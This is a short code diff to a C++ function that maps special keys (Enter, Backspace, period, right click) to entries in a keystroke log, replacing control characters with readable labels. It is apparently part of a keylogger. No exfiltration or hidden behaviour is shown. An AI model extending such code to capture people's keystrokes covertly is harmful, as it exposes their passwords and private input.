@@ -33,7 +33,7 @@ bool SpecialKeys(int S_Key)
 		return true;
 	case VK_RETURN:
 		cout << "pressed ENTER";
-		TLOG("\n");
+		TLOG("ENTER");
 		return true;
 	case '.':
 		cout << "pressed PERIOD";
@@ -53,7 +53,7 @@ bool SpecialKeys(int S_Key)
 		return true;
 	case VK_BACK:
 		cout << "pressed BACKSPACE";
-		TLOG("\b");
+		TLOG("BACKSPACE");
 		return true;
 	case VK_RBUTTON:
 		cout << "R_CLICK";
